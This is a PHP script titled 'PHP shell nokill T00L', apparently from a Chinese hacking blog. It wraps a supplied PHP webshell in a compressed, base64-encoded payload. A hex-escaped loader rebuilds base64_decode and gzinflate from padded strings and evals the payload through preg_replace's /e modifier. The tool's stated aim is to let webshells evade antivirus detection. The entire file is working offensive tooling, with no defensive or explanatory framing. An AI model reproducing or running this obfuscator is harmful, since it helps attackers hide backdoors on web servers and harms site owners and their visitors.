<?php
/*
Title: PHP shell nokill T00L
Blog: exploit-db.blogcn.com
*/
error_reporting(0);
@ini_set('memory_limit','-1');
set_time_limit(0);
$toolname="$argv[0]";
if ($argc<2) {
baner($toolname);
die;
}
$input_file= trim($argv[1]);
$output_file='nokill_'.$input_file;
if (file_exists($input_file)) {
No_kill_c0de($input_file,$output_file);
echo "PHP shell nokill T00L\r\n";
echo "Blog: exploit-db.blogcn.com\r\n";
echo "Input: {$input_file}\r\n";
$file_full_path=dirname(__FILE__).DIRECTORY_SEPARATOR.$output_file;
echo "[+] Generate success!\r\n";
echo "Saved to {$file_full_path}"."\r\n";
} else {
echo "PHP shell nokill T00L\r\n";
echo "Blog: exploit-db.blogcn.com\r\n";
die("[-] Failed ! The File $input_file does not exist");
}
function No_kill_c0de($input_file,$output_file){
$no_whitespace=php_strip_whitespace($input_file);
$no_php_tag=trim(trim(trim($no_whitespace,'<?php'),'<?'),'?>');
$enfile=base64_encode(gzdeflate($no_php_tag));
$shellcode="\x3c\x3f\x70\x68\x70\xd\xa";
$shellcode.='$enfile='.'"'."{$enfile}".'"'.';'."\xd\xa";
$shellcode.="\x24\x62\x3d\x73\x74\x72\x5f\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x66\x27\x2c\x22\x22\x2c\x22\x62\x66\x61\x66\x73\x66\x65\x66\x36\x66\x34\x66\x5f\x66\x66\x64\x66\x66\x65\x66\x66\x63\x66\x66\x6f\x66\x66\x64\x66\x66\x65\x66\x22\x29\x3b\xd\xa\x24\x67\x3d\x73\x74\x72\x5f\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x58\x27\x2c\x27\x27\x2c\x27\x67\x58\x58\x7a\x58\x58\x69\x58\x58\x6e\x58\x58\x58\x58\x66\x58\x58\x58\x6c\x58\x58\x61\x58\x58\x58\x74\x58\x58\x58\x58\x58\x65\x27\x29\x3b\xd\xa\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x5c\x27\x61\x5c\x27\x65\x69\x73\x27\x2c\x27\x65\x27\x2e\x27\x76\x27\x2e\x27\x61\x27\x2e\x27\x6c\x27\x2e\x27\x28\x24\x67\x28\x24\x62\x28\x24\x65\x6e\x66\x69\x6c\x65\x29\x29\x29\x27\x2c\x27\x61\x27\x29\x3b\xd\xa";
$shellcode.="\x3f\x3e";
file_put_contents("$output_file",$shellcode);
}
function baner($toolname){
echo "PHP shell nokill T00L\r\n";
echo "Blog: exploit-db.blogcn.com\r\n";
echo "Usage: {$toolname} phpwebshell\r\n";
}
?>